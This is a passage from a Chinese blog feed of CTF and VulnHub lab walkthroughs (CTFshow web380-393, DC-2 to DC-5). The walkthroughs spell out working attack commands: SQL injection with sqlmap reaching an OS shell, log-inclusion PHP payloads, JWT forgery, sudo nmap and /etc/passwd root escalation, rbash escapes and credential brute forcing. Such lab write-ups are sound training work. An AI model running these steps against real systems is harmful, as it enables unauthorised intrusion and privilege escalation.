class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token parameter variable">-la</span> /home/jens/backups.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230205153349628.png"></p><p>属于 jens 权限，向该文件中写入 /bin/bash，然后以 jens 执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"/bin/bash"</span> <span class="token operator">&gt;</span> /home/jens/backups.sh<span class="token function">sudo</span> <span class="token parameter variable">-u</span> jens /home/jens/backups.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230205153839478.png"></p><p>获得了 jens 用户权限</p><p><img src="/../../../../../pic/image-20230205153902793.png"></p><p>可以以 root 用户权限执行 nmap，nmap 可以加载自定义脚本，于是利用这个点获得 shell</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'os.execute("/bin/sh")'</span> <span class="token operator">&gt;</span> shell<span class="token function">sudo</span> nmap <span class="token parameter variable">--script</span> shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230205154343929.png"></p><h3 id="3-1-FLAG"><a href="#3-1-FLAG" class="headerlink" title="3.1 FLAG"></a>3.1 FLAG</h3><p>读取 /root 目录下的 flag</p><p><img src="/../../../../../pic/image-20230205154456188.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VulnHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF 秀 - 黑盒测试</title>
      <link href="/2023/02/02/catchtheflag/ctf-xiu/ctf-xiu-hei-he-ce-shi/"/>
      <url>/2023/02/02/catchtheflag/ctf-xiu/ctf-xiu-hei-he-ce-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-秀-黑盒测试"><a href="#CTF-秀-黑盒测试" class="headerlink" title="CTF 秀 - 黑盒测试"></a>CTF 秀 - 黑盒测试</h1><h2 id="1-web380"><a href="#1-web380" class="headerlink" title="1. web380"></a>1. web380</h2><p>扫描了一下目录</p><p><img src="/../../../pic/image-20230202210700876.png"></p><p>访问 page.php</p><p><img src="/../../../pic/image-20230202210752998.png"></p><p>id 没有传值，使用 GET 方式传入 /page.php?id=1</p><p><img src="/../../../pic/image-20230202210835679.png"></p><p>读取了 1.php，修改 id 为 flag 访问 /page.php?id=flag</p><p>查看源码获得 flag</p><p><img src="/../../../pic/image-20230202210926548.png"></p><h2 id="2-web381"><a href="#2-web381" class="headerlink" title="2. web381"></a>2. web381</h2><p>查看页面源码</p><p><img src="/../../../pic/image-20230202211210283.png"></p><p>访问 /alsckdfy/ 进入后台</p><p><img src="/../../../pic/image-20230202211245165.png"></p><h2 id="3-web382-web383"><a href="#3-web382-web383" class="headerlink" title="3. web382 - web383"></a>3. web382 - web383</h2><p>访问 /alsckdfy/ 进入后台</p><p>使用弱口令登录 admin’ or 1=1# / 123456</p><h2 id="4-web384"><a href="#4-web384" class="headerlink" title="4. web384"></a>4. web384</h2><p>题目提示密码前2位是小写字母，后三位是数字，进行爆破</p><p>最后爆破出来密码为 xy123</p><h2 id="5-web385"><a href="#5-web385" class="headerlink" title="5. web385"></a>5. web385</h2><p>扫描一下目录</p><p><img src="/../../../pic/image-20230202215817773.png"></p><p>多出了一个 /install，访问 /install</p><p><img src="/../../../pic/image-20230202220046784.png"></p><p>再访问 /install/?install</p><p><img src="/../../../pic/image-20230202220124602.png"></p><p>然后登录后台使用 admin / admin888 登录</p><h2 id="6-web386"><a href="#6-web386" class="headerlink" title="6. web386"></a>6. web386</h2><p>扫描下目录</p><p><img src="/../../../pic/image-20230202220826120.png"></p><p>存在个 clear.php </p><p>先访问 /install</p><p><img src="/../../../pic/image-20230202221040800.png"></p><p>访问 /clear.php</p><p><img src="/../../../pic/image-20230202221505886.png"></p><p>但是访问 /install 后是要清理，应该需要指定文件进行删除文件</p><p>访问 /clear.php?file=./install/lock.dat 清除文件</p><p>然后访问 /install/?install 后使用默认用户登录 </p><h2 id="7-web387"><a href="#7-web387" class="headerlink" title="7. web387"></a>7. web387</h2><p>扫描目录看一下增加了啥</p><p><img src="/../../../pic/image-20230202235627787.png"></p><p>多了个 debug，使用 clear.php 删除不掉文件了，访问 /debug</p><p>测试一下在 参数 file 处可以进行文件包含，包含日志 getshell</p><p>在 UA 中插入 <code>&lt;?php system('rm /var/www/html/install/lock.dat');?&gt;</code> 删除掉配置文件</p><p>然后进行上一题的步骤进入后台拿 flag</p><h2 id="8-web388"><a href="#8-web388" class="headerlink" title="8. web388"></a>8. web388</h2><p>扫描下 /alsckdfy/ 目录</p><p><img src="/../../../pic/image-20230203172418071.png"></p><p>还存在一个编辑器</p><p>访问 /alsckdfy/editor/ 为 KindEditor</p><p>访问/alsckdfy/editor/kindeditor.js 获得版本为 KindEditor 4.1.11，这个版本存在文件上传漏洞 CVE-2017-1002024</p><p>上传一个 shell</p><p><img src="/../../../pic/image-20230203173611079.png"></p><p>访问 clear.php 发现会将结果写入到日志中，然后包含日志，随后访问 /shell.php 获得 shell</p><p>然后读取 /alsckdfy/check.php 获得 flag </p><h2 id="9-web389"><a href="#9-web389" class="headerlink" title="9. web389"></a>9. web389</h2><p>访问 /debug/ 提示权限不足</p><p>存在 JWT 认证，爆破一手秘钥</p><p><img src="/../../../pic/image-20230203174622813.png"></p><p>拿着该秘钥生成新 token</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"fmt"</span><span class="token string">"github.com/golang-jwt/jwt/v4"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>claims <span class="token operator">:=</span> jwt<span class="token punctuation">.</span>MapClaims<span class="token punctuation">{</span><span class="token string">"iss"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"iat"</span><span class="token punctuation">:</span> <span class="token number">1675417117</span><span class="token punctuation">,</span><span class="token string">"exp"</span><span class="token punctuation">:</span> <span class="token number">1675424317</span><span class="token punctuation">,</span><span class="token string">"nbf"</span><span class="token punctuation">:</span> <span class="token number">1675417117</span><span class="token punctuation">,</span><span class="token string">"sub"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"jti"</span><span class="token punctuation">:</span> <span class="token string">"7b5244b58cdc39cea008baa362b8ea9f"</span><span class="token punctuation">,</span><span class="token punctuation">}</span>token <span class="token operator">:=</span> jwt<span class="token punctuation">.</span><span class="token function">NewWithClaims</span><span class="token punctuation">(</span>jwt<span class="token punctuation">.</span>SigningMethodHS256<span class="token punctuation">,</span> claims<span class="token punctuation">)</span>signedString<span class="token punctuation">,</span> err <span class="token operator">:=</span> token<span class="token punctuation">.</span><span class="token function">SignedString</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"123456"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span><span class="token keyword">return</span><span class="token punctuation">}</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"token = %v"</span><span class="token punctuation">,</span> signedString<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>带着 token 访问</p><p><img src="/../../../pic/image-20230203180543075.png"></p><p>之后的步骤和上一题一样</p><h2 id="10-web390"><a href="#10-web390" class="headerlink" title="10. web390"></a>10. web390</h2><p>在 page.php 处存在 sql 注入，直接上 sqlmap 跑读取文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> http://508a94c9-0f28-42e5-add0-ce18ba09d0bd.challenge.ctf.show/page.php?id<span class="token operator">=</span><span class="token number">1</span> --file-read <span class="token string">"/var/www/html/alsckdfy/check.php"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../pic/image-20230203193917300.png"></p><h2 id="11-web391"><a href="#11-web391" class="headerlink" title="11. web391"></a>11. web391</h2><p>扫描目录</p><p><img src="/../../../pic/image-20230203194149619.png"></p><p>多出来一个 search.php，参数为 title</p><p>一样拿 sqlmap 跑</p><h2 id="12-web392"><a href="#12-web392" class="headerlink" title="12. web392"></a>12. web392</h2><p>还是在 search.php 进行 sql 注入，这次直接获得shell</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> http://42449ce0-4bf7-4e44-8e3f-a1e7380a4867.challenge.ctf.show/search.php?title<span class="token operator">=</span><span class="token number">1</span> --os-shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../pic/image-20230203201645574.png"></p><h2 id="13-web393"><a href="#13-web393" class="headerlink" title="13. web393"></a>13. web393</h2>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF 秀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub - DC_5</title>
      <link href="/2023/02/02/penetrationstest/ba-chang-xue-xi/vulnhub/dc-xi-lie/vulnhub-dc-5/"/>
      <url>/2023/02/02/penetrationstest/ba-chang-xue-xi/vulnhub/dc-xi-lie/vulnhub-dc-5/</url>
      
        <content type="html"><![CDATA[<h1 id="VulnHub-DC-5"><a href="#VulnHub-DC-5" class="headerlink" title="VulnHub - DC_5"></a>VulnHub - DC_5</h1><h2 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h2><ul><li><p>靶场地址：<a href="https://www.vulnhub.com/entry/dc-5,314/">VulnHub 链接</a></p></li><li><p>难度：简单</p></li><li><p>靶机目标：获取 1 个flag</p></li></ul><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h2><h3 id="2-1-主机探测"><a href="#2-1-主机探测" class="headerlink" title="2.1 主机探测"></a>2.1 主机探测</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.0.1/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230202082736703.png"></p><h3 id="2-2-端口扫描"><a href="#2-2-端口扫描" class="headerlink" title="2.2 端口扫描"></a>2.2 端口扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sC</span> -p- <span class="token parameter variable">-T4</span> <span class="token number">192.168</span>.0.149<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230202082915742.png"></p><p>主要还是看 80 端口</p><h2 id="3-WEB-渗透"><a href="#3-WEB-渗透" class="headerlink" title="3. WEB 渗透"></a>3. WEB 渗透</h2><p>访问 <a href="http://192.168.0.149/">http://192.168.0.149/</a></p><p><img src="/../../../../../pic/image-20230202083008377.png"></p><p>照理探测下技术</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">whatweb http://192.168.0.149/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230202083107930.png"></p><p>扫描下目录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> <span class="token string">"http://192.168.0.149/"</span> <span class="token parameter variable">-w</span> /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt <span class="token parameter variable">-x</span> <span class="token string">"php,html,zip"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230202084613233.png"></p><p>访问 footer.php 发现内容会发生改变，访问 thankyou.php 时起页脚也会发生改变，由此推断存在文件包含</p><p>访问 <a href="http://192.168.0.149/thankyou.php?file=/etc/passwd">http://192.168.0.149/thankyou.php?file=/etc/passwd</a> </p><p><img src="/../../../../../pic/image-20230202084824984.png"></p><p>存在文件包含漏洞，包含 nginx 日志 getshell</p><p>在 referrer 中插入 shell</p><p><img src="/../../../../../pic/image-20230202085331826.png"></p><p>弹个 shell</p><p><img src="/../../../../../pic/image-20230202085453231.png"></p><h2 id="4-提权"><a href="#4-提权" class="headerlink" title="4. 提权"></a>4. 提权</h2><p>查找下可用的 SUID</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用 linpeas.sh 搜集一下</p><p><img src="/../../../../../pic/image-20230202090310339.png"></p><p>存在一个 screen-4.5.0，查找下是否存在漏洞</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit <span class="token function">screen</span> <span class="token number">4.5</span>.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230202090652675.png"></p><p>将 sh 文件上传到靶机后运行</p><h3 id="4-1-flag"><a href="#4-1-flag" class="headerlink" title="4.1 flag"></a>4.1 flag</h3><p><img src="/../../../../../pic/image-20230202091523167.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VulnHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub - DC_4</title>
      <link href="/2023/02/02/penetrationstest/ba-chang-xue-xi/vulnhub/dc-xi-lie/vulnhub-dc-4/"/>
      <url>/2023/02/02/penetrationstest/ba-chang-xue-xi/vulnhub/dc-xi-lie/vulnhub-dc-4/</url>
      
        <content type="html"><![CDATA[<h1 id="VulnHub-DC-4"><a href="#VulnHub-DC-4" class="headerlink" title="VulnHub - DC_4"></a>VulnHub - DC_4</h1><h2 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h2><ul><li><p>靶场地址：<a href="https://www.vulnhub.com/entry/dc-4,313/">VulnHub 链接</a></p></li><li><p>难度：简单</p></li><li><p>靶机目标：获取 1 个flag</p></li></ul><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h2><h3 id="2-1-主机发现"><a href="#2-1-主机发现" class="headerlink" title="2.1 主机发现"></a>2.1 主机发现</h3><p>使用 nmap 进行探测</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.0.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230202070445400.png"></p><h3 id="2-2-端口探测"><a href="#2-2-端口探测" class="headerlink" title="2.2 端口探测"></a>2.2 端口探测</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sC</span> -p- <span class="token parameter variable">-T4</span> <span class="token number">192.168</span>.0.151<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230202070558860.png"></p><p>开放了 22 端口与 80 端口</p><h2 id="3-WEB-渗透"><a href="#3-WEB-渗透" class="headerlink" title="3. WEB 渗透"></a>3. WEB 渗透</h2><p>访问 <a href="http://192.168.0.151/">http://192.168.0.151/</a></p><p><img src="/../../../../../pic/image-20230202070714292.png"></p><p>直接给了一个登录页面</p><p>探测下技术</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">whatweb http://192.168.0.151/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>挺干净的，扫描了一下目录没有啥收获</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> <span class="token string">"http://192.168.0.151/"</span> <span class="token parameter variable">-w</span> <span class="token string">"/usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt"</span> <span class="token parameter variable">-x</span> <span class="token string">"php,html,zip"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230202071150442.png"></p><p>存在几个页面但是访问进去都需要认证</p><p>那就爆破一下登录</p><p>爆破出来账户为 admin / happy，进入 command.php 发现可以进行任意命令执行</p><p><img src="/../../../../../pic/image-20230202073442832.png"></p><p>获得 /etc/passwd 发现存在三个用户，看下目录下都有啥</p><p><img src="/../../../../../pic/image-20230202073707290.png"></p><p>在 jim 用户目录下存在三个文件</p><p><img src="/../../../../../pic/image-20230202073818704.png"></p><p>在 backups 下找到一个密码字典，尝试用该字典去爆破三个用户</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra <span class="token parameter variable">-L</span> username.txt <span class="token parameter variable">-P</span> password.txt <span class="token parameter variable">-s</span> <span class="token number">22</span> <span class="token parameter variable">-t</span> <span class="token number">20</span> ssh://192.168.0.151<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230202081409071.png"></p><p>获取到用户 jim 的密码</p><h2 id="4-提权"><a href="#4-提权" class="headerlink" title="4. 提权"></a>4. 提权</h2><p>查看下根目录下的 mbox</p><p><img src="/../../../../../pic/image-20230202075033292.png"></p><p>只是一封来自 root 用户的邮件</p><p>在 var 目录下发现存在邮件目录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /var/mail/jim<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230202075243781.png"></p><p>这就获取到了 charles 用户的密码，切换到 charles 用户</p><p>查看 sudo 权限</p><p><img src="/../../../../../pic/image-20230202080353302.png"></p><p>看一下该文件能做什么</p><p><img src="/../../../../../pic/image-20230202080654474.png"></p><p>可以以 root 权限将内容写入到文件之中，</p><p>这里向 /etc/passwd 中写入一个无密码 root 用户</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"admin::0:0:::/bin/bash"</span> <span class="token operator">|</span> <span class="token function">sudo</span> teehee <span class="token parameter variable">-a</span> /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后切换到 admin 用户获得 root 权限</p><h3 id="4-1-flag"><a href="#4-1-flag" class="headerlink" title="4.1 flag"></a>4.1 flag</h3><p><img src="/../../../../../pic/image-20230202081121315.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VulnHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub - DC_3</title>
      <link href="/2023/02/02/penetrationstest/ba-chang-xue-xi/vulnhub/dc-xi-lie/vulnhub-dc-3/"/>
      <url>/2023/02/02/penetrationstest/ba-chang-xue-xi/vulnhub/dc-xi-lie/vulnhub-dc-3/</url>
      
        <content type="html"><![CDATA[<h1 id="VulnHub-DC-3"><a href="#VulnHub-DC-3" class="headerlink" title="VulnHub - DC_3"></a>VulnHub - DC_3</h1><h2 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h2><ul><li><p>靶场地址：<a href="https://www.vulnhub.com/entry/dc-3,312/">VulnHub 链接</a></p></li><li><p>难度：简单</p></li><li><p>靶机目标：获取 1 个flag</p></li></ul><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h2><h3 id="2-1-主机发现"><a href="#2-1-主机发现" class="headerlink" title="2.1 主机发现"></a>2.1 主机发现</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.0.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230202052122768.png"></p><h3 id="2-2-端口扫描"><a href="#2-2-端口扫描" class="headerlink" title="2.2 端口扫描"></a>2.2 端口扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sC</span> -p- <span class="token parameter variable">-T4</span> <span class="token number">192.168</span>.0.106<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230202052234487.png"></p><p>只开放了 80 端口</p><h2 id="3-WEB-渗透"><a href="#3-WEB-渗透" class="headerlink" title="3. WEB 渗透"></a>3. WEB 渗透</h2><p>访问 <a href="http://192.168.0.106/">http://192.168.0.106/</a></p><p><img src="/../../../../../pic/image-20230202052318846.png"></p><p>检测技术</p><p><img src="/../../../../../pic/image-20230202052352735.png"></p><p>使用到了一个开源的 Joomla 框架</p><p>直接上 joomscan 扫描一下</p><p><img src="/../../../../../pic/image-20230202052835742.png"></p><p>使用到的 版本为 3.7.0</p><p>后台地址为 <a href="http://192.168.0.106/administrator/">http://192.168.0.106/administrator/</a></p><p>查找一下历史漏洞</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">searchsploit <span class="token class-name">Joomla</span> <span class="token number">3.7</span><span class="token number">.0</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230202053138497.png"></p><p>存在一个 SQL 注入漏洞，尝试是否能把用户账户搞出来，直接上 sqlmap 跑</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://192.168.0.106/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> <span class="token parameter variable">--risk</span><span class="token operator">=</span><span class="token number">3</span> <span class="token parameter variable">--level</span><span class="token operator">=</span><span class="token number">5</span> --random-agent <span class="token parameter variable">--dbs</span> <span class="token parameter variable">-p</span> list<span class="token punctuation">[</span>fullordering<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获得 admin 用户密码</p><pre class="line-numbers language-none"><code class="language-none">$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 john 爆破一下</p><p><img src="/../../../../../pic/image-20230202055239754.png"></p><p>获得明文 snoopy</p><p>使用 admin / snoopy 登录进后台，在模板处写入 shell</p><p><img src="/../../../../../pic/image-20230202061151467.png"></p><p>新建一个 php 文件</p><p><img src="/../../../../../pic/image-20230202061225846.png">访问 <a href="http://192.168.0.106/templates/beez3/shell.php">http://192.168.0.106/templates/beez3/shell.php</a> 获得 shell</p><p><img src="/../../../../../pic/image-20230202061550035.png"></p><p>反弹个 shell</p><h2 id="4-提权"><a href="#4-提权" class="headerlink" title="4. 提权"></a>4. 提权</h2><p>查找 Ubuntu 16.04 可用的漏洞</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit Ubuntu <span class="token number">16.04</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230202061936576.png"></p><p>使用文档中给出的地址下载下来 exp 执行</p><p><img src="/../../../../../pic/image-20230202063100127.png"></p><h3 id="4-1-Flag"><a href="#4-1-Flag" class="headerlink" title="4.1 Flag"></a>4.1 Flag</h3><p>读取 flag</p><p><img src="/../../../../../pic/image-20230202063129074.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VulnHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub - DC_2</title>
      <link href="/2023/02/02/penetrationstest/ba-chang-xue-xi/vulnhub/dc-xi-lie/vulnhub-dc-2/"/>
      <url>/2023/02/02/penetrationstest/ba-chang-xue-xi/vulnhub/dc-xi-lie/vulnhub-dc-2/</url>
      
        <content type="html"><![CDATA[<h1 id="VulnHub-DC-2"><a href="#VulnHub-DC-2" class="headerlink" title="VulnHub - DC_2"></a>VulnHub - DC_2</h1><h2 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h2><ul><li><p>靶场地址：<a href="https://www.vulnhub.com/entry/dc-2,311/">VulnHub 链接</a></p></li><li><p>难度：简单</p></li><li><p>靶机目标：获取5 个flag</p></li></ul><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h2><h3 id="2-1-主机发现"><a href="#2-1-主机发现" class="headerlink" title="2.1 主机发现"></a>2.1 主机发现</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.0.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230202041510406.png"></p><h3 id="2-2-端口探测"><a href="#2-2-端口探测" class="headerlink" title="2.2 端口探测"></a>2.2 端口探测</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sC</span> -p- <span class="token parameter variable">-T4</span> <span class="token number">192.168</span>.0.131<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230202041633729.png"></p><p>ssh 端口开放在了 7744 上，80 端口还是 web 服务</p><p>简单连了一下 ssh 没有啥收获</p><h2 id="3-WEB-渗透"><a href="#3-WEB-渗透" class="headerlink" title="3 WEB 渗透"></a>3 WEB 渗透</h2><p>访问 <a href="http://192.168.0.131/">http://192.168.0.131/</a> 结果跳转到了 <a href="http://dc-2/%EF%BC%8C%E7%BB%91%E5%AE%9A%E4%B8%80%E4%B8%8B">http://dc-2/，绑定一下</a> hosts 重新访问</p><p><img src="/../../../../../pic/image-20230202041957595.png"></p><p>是一个 WordPress 站点，还是检测下使用到的技术</p><p><img src="/../../../../../pic/image-20230202042037417.png"></p><p>使用 WordPress 4.7.10 搭建</p><h3 id="3-1-Flag-1"><a href="#3-1-Flag-1" class="headerlink" title="3.1 Flag 1"></a>3.1 Flag 1</h3><p>在页面下找到 flag 1</p><p><img src="/../../../../../pic/image-20230202043159263.png"></p><h3 id="3-2-Flag-2"><a href="#3-2-Flag-2" class="headerlink" title="3.2 Flag 2"></a>3.2 Flag 2</h3><p>提示使用 cewl ，cewl 是一个字典生成工具，可以使用该工具根据网站生成字典文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cewl http://dc-2/ <span class="token parameter variable">-w</span> dict.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后使用 wpscan 进行爆破</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan <span class="token parameter variable">--url</span> <span class="token string">"http://dc-2/"</span> <span class="token parameter variable">--passwords</span> dict.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230202043658398.png"></p><p>成功探测出来两个用户，使用 jerry / adipiscing 登录进后台查看 pages 找到 flag2</p><p><img src="/../../../../../pic/image-20230202043954212.png"></p><p>这一段提示寻找另一条路，扫描了一下目录没有啥新的收获，使用或得到的用户去链接 ssh</p><h2 id="4-提权"><a href="#4-提权" class="headerlink" title="4. 提权"></a>4. 提权</h2><p>使用 tom / parturient 成功连接上 SSH</p><h3 id="4-1-Flag-3"><a href="#4-1-Flag-3" class="headerlink" title="4.1 Flag 3"></a>4.1 Flag 3</h3><p>在 tom 家目录下获得 flag3</p><p><img src="/../../../../../pic/image-20230202045424267.png"></p><h3 id="4-2-Flag-4"><a href="#4-2-Flag-4" class="headerlink" title="4.2 Flag 4"></a>4.2 Flag 4</h3><p>尝试切换目录发现使用 rbash 限制住，使用 vi 进行绕过</p><pre class="line-numbers language-none"><code class="language-none">:set shell=/bin/bash:shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>或者使用 echo 来绕过</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token environment constant">BASH_CMDS</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token operator">=</span>/bin/sh<span class="token punctuation">;</span>a$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token environment constant">$PATH</span>:/bin/$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token environment constant">$PATH</span>:/usr/bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在 jerry 家目录下获得 flag4</p><p><img src="/../../../../../pic/image-20230202045620160.png"></p><h3 id="4-3-Flag-5"><a href="#4-3-Flag-5" class="headerlink" title="4.3 Flag 5"></a>4.3 Flag 5</h3><p>查看当前用户的 sudo 权限</p><p><img src="/../../../../../pic/image-20230202050411602.png"></p><p>切换到 jerry </p><p><img 